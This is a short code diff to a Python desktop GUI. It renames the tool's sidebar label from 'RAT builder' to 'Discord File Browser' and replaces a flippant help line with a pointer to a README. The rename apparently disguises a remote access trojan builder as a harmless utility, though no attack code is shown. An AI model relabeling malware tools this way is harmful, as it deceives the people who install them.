@@ -130,7 +130,7 @@ class Gui(customtkinter.CTk):
         ).pack(side="left")
 
         customtkinter.CTkLabel(
-            self.sidebar, text="RAT builder  v1.0",
+            self.sidebar, text="Discord File Browser   v1.0",
             font=FONT_BADGE, text_color=TEXT_DIM
         ).pack(padx=20, anchor="w", pady=(0, 22))
 
@@ -323,7 +323,7 @@ class Gui(customtkinter.CTk):
 
         customtkinter.CTkLabel(
             card,
-            text="Figure it out yo self twin",
+            text="Find guide in README.md",
             font=("Georgia", 14),
             text_color=TEXT_DIM,
         ).pack(expand=True)
